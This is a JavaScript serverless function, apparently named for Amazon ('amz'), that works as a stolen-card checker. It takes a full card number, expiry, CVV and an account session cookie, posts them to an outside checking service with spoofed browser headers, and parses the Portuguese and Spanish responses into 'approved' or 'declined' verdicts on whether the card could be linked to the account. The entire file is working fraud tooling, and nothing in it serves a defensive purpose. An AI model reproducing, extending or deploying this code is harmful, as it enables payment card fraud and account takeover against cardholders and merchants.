// api/amz.js — Vercel Serverless Function
// GET /api/amz?card=CC|MM|YY|CVV&cookie=...

import * as cheerio from 'cheerio';

export const config = { maxDuration: 60 };

// ── Helpers ───────────────────────────────────────────────────────────────────

function parseCard(card) {
  const digits = card.match(/\d+/g);
  if (!digits || digits.length < 4) throw new Error('Invalid card format');
  const [cc, month, year, cvv] = digits;
  return {
    cc,
    month: month.padStart(2, '0'),
    year: year.length === 2 ? `20${year}` : year,
    cvv,
  };
}

function parseStatus(text) {
  const raw   = text.trim();
  const lower = raw.toLowerCase();
  const removed = raw.includes('✅') || raw.includes('✅️');
  const removedStr = removed ? '✅️' : '❌️';

  if (['passkey', 'erro ao obter acesso', 'faça login novamente', 'minha conta']
      .some(k => lower.includes(k)))
    return { status: 'declined', message: 'Invalid Cookies! - PassKey Error' };

  if (lower.includes('no cookie') || lower.includes('sem cookie'))
    return { status: 'declined', message: 'Invalid Cookies! (Dead ✅️)' };

  if (lower.startsWith('erros') || (lower.includes('cookie') && lower.includes('expirou')))
    return { status: 'declined', message: 'Cookie Expired or Invalid!' };

  if (['aprovada', 'vinculado com sucesso', 'card successfully', 'charged', 'thank you']
      .some(k => lower.includes(k)))
    return { status: 'approved', message: `Card Added Successfully (Removed: ${removedStr})` };

  if (['inexistente', 'reprovada', 'cartão inexistente', 'card not found', 'declined']
      .some(k => lower.includes(k)))
    return { status: 'declined', message: `Card Declined [Inexistente] (Removed: ${removedStr})` };

  if (lower.includes('erro ao obter') || lower.includes('tarjeta vinculada'))
    return { status: 'declined', message: 'Error al obtener tarjeta vinculada.' };

  return {
    status:  'declined',
    message: raw ? `Card Declined | ${raw.slice(0, 80)}` : 'Card Declined',
  };
}

// ── Handler ───────────────────────────────────────────────────────────────────

export default async function handler(req, res) {
  if (req.method !== 'GET')
    return res.status(405).json({ error: 'Method not allowed' });

  const { card, cookie } = req.query;

  if (!card)
    return res.status(400).json({ error: 'Missing ?card= parameter' });

  if (!cookie)
    return res.status(400).json({ error: 'Missing ?cookie= parameter' });

  let parsed;
  try {
    parsed = parseCard(card);
  } catch (e) {
    return res.status(400).json({ error: e.message });
  }

  const cardString = `${parsed.cc}|${parsed.month}|${parsed.year}|${parsed.cvv}`;

  const formData = new URLSearchParams();
  formData.append('lista',   cardString);
  formData.append('cookies', cookie);

  const headers = {
    'authority':          'cruuzchecker.com',
    'accept':             '*/*',
    'accept-language':    'es-US,es-419;q=0.9,es;q=0.8',
    'origin':             'https://cruuzchecker.com',
    'referer':            'https://cruuzchecker.com/',
    'sec-ch-ua':          '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile':   '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest':     'empty',
    'sec-fetch-mode':     'cors',
    'sec-fetch-site':     'same-origin',
    'user-agent':         'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
    'content-type':       'application/x-www-form-urlencoded',
  };

  let html;
  try {
    const response = await fetch('https://cruuzchecker.com/us.php', {
      method:  'POST',
      headers,
      body:    formData.toString(),
      signal:  AbortSignal.timeout(55000),
    });
    html = await response.text();
  } catch (e) {
    return res.status(500).json({
      status:  'error',
      message: e.name === 'TimeoutError' ? 'Request timeout (55s)' : `Fetch error: ${e.message}`,
    });
  }

  // ── Parse HTML ────────────────────────────────────────────────────────────
  const $          = cheerio.load(html);
  const statusText = $('span.text-danger').text().replace(/\s+/g, ' ').trim();
  const usuario    = $('span.text-warning').text().trim();
  const tempoMatch = html.match(/Tempo de resposta: \((\w+)\)/);
  const tempo      = tempoMatch ? tempoMatch[1] : 'N/A';

  // Fallback: buscar en HTML raw si el span está vacío
  if (!statusText) {
    const lower = html.toLowerCase();
    if (lower.includes('passkey') || lower.includes('faça login'))
      return res.json({ status: 'declined', message: 'Invalid Cookies! - PassKey Error', card: cardString, tempo });
    if (lower.includes('aprovada'))
      return res.json({ status: 'approved', message: 'Card Added Successfully', card: cardString, tempo });
    if (lower.includes('inexistente'))
      return res.json({ status: 'declined', message: 'Card Declined [Inexistente]', card: cardString, tempo });
    if (lower.includes('erros'))
      return res.json({ status: 'declined', message: 'Cookie Expired or Invalid!', card: cardString, tempo });
    return res.json({ status: 'declined', message: 'Card Declined (No resp)', card: cardString, tempo });
  }

  const { status, message } = parseStatus(statusText);

  return res.json({
    status,
    message: `${message} | ${tempo}`,
    card:    cardString,
    usuario: usuario || null,
    tempo,
  });
}
